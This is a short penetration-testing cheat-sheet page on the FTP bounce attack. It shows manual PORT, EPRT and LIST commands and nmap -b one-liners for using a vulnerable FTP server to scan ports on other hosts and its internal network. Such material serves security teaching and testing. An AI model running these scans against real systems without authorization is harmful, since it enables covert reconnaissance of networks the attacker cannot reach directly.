# FTP Bounce attack - Scan

## FTP Bounce - Scanning

### Manual

1. Connect to vulnerable FTP
2. Use **`PORT`**or **`EPRT`**\(but only 1 of them\) to make it establish a connection with the _&lt;IP:Port&gt;_ you want to scan:

   `PORT 172,32,80,80,0,8080`  
   `EPRT |2|172.32.80.80|8080|`

3. Use **`LIST`**\(this will just send to the connected _&lt;IP:Port&gt;_ the list of current files in the FTP folder\) and check for the possible responses: `150 File status okay` \(This means the port is open\) or `425 No connection established` \(This means the port is closed\)
   1. Instead of `LIST` you could also use **`RETR /file/in/ftp`** and look for similar `Open/Close` responses.

Example Using **PORT** \(port 8080 of 172.32.80.80 is open and port 7777 is closed\):

![](../../.gitbook/assets/image%20%2885%29.png)

Same example using **`EPRT`**\(authentication omitted in the image\):

![](../../.gitbook/assets/image%20%28199%29.png)

Open port using `EPRT` instead of `LIST` \(different env\)

![](../../.gitbook/assets/image%20%28339%29.png)

### **nmap**

```bash
nmap -b <name>:<pass>@<ftp_server> <victim>
nmap -Pn -v -p 21,80 -b ftp:ftp@10.2.1.5 127.0.0.1 #Scan ports 21,80 of the FTP
nmap -v -p 21,22,445,80,443 -b ftp:ftp@10.2.1.5 192.168.0.1/24 #Scan the internal network (of the FTP) ports 21,22,445,80,443
```

